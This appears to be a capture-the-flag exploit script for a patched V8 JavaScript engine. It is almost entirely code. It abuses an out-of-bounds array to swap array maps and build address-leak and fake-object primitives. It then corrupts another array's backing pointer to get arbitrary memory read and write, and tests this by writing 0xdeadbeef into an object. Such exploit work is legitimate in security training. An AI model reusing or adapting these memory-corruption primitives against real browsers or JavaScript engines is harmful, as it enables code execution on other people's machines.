const array_buffer = new ArrayBuffer(8);
let data_view = new DataView(array_buffer);
let log = console.log;

let u2d = (value) => {
    data_view.setBigUint64(0, value);
    return data_view.getFloat64(0);
};

let d2u = (value) => {
    data_view.setFloat64(0, value);
    return data_view.getBigUint64(0);
};

let hex = (value) => {
    return '0x' + value.toString(16).padStart(16, "0");
}


let oob_arr = [.1];
let obj_arr = [{}];
let float_arr = [.1];
let rw_arr = [.1];

% DebugPrint(oob_arr);
% DebugPrint(float_arr);
% DebugPrint(obj_arr);
% DebugPrint(rw_arr);

oob_arr.len(0x12138);

// oob_arr[12] points to the map of float_arr
// oob_arr[8] points to the map of obj_arr
// log("oob_arr " + hex(d2u(oob_arr[12])));
// log(oob_arr[12]);

let float_arr_map = d2u(oob_arr[12]);
let obj_arr_map = d2u(oob_arr[8]);

let offset_of = (obj) => {
    oob_arr[8] = u2d(obj_arr_map);
    obj_arr[0] = obj;
    oob_arr[8] = u2d((float_arr_map & 0xffffffffn) | (obj_arr_map & 0xffffffff00000000n));
    return d2u(obj_arr[0]) & 0xffffffffn;
};
let fake_obj = (offset) => {
    oob_arr[12] = u2d(float_arr_map);
    float_arr[0] = u2d(offset);
    oob_arr[12] = u2d((obj_arr_map & 0xffffffffn) | (float_arr_map & 0xffffffff00000000n));
    return float_arr[0];
};

let a = [1, 2, 3];
log("a: ", hex(offset_of(a)));
% DebugPrint(a);

// 修改job(rw_arr)->elements，指向job(offset)，
// 然后通过rw_arr[0]，读取/修改job(rw_arr)->elements[0]
let arb_read = (offset) => {
    oob_arr[17] = u2d(((offset - 0x8n) | 1n) | (d2u(oob_arr[17]) & 0xffffffff00000000n));
    return d2u(rw_arr[0]);
};
let arb_write = (offset, value) => {
    oob_arr[17] = u2d(((offset - 0x8n) | 1n) | (d2u(oob_arr[17]) & 0xffffffff00000000n));
    rw_arr[0] = u2d(value);
};

// % SystemBreak();
log("arb_read:" + hex(arb_read(offset_of(a))));
arb_write(offset_of(a), 0xdeadbeefn);
log("arb_read:" + hex(arb_read(offset_of(a))));

% SystemBreak();
/**
 * r --allow-natives-syntax --shell /datav8/v8test1/challs/sandbox/exp1.js
 * % SystemBreak();
 */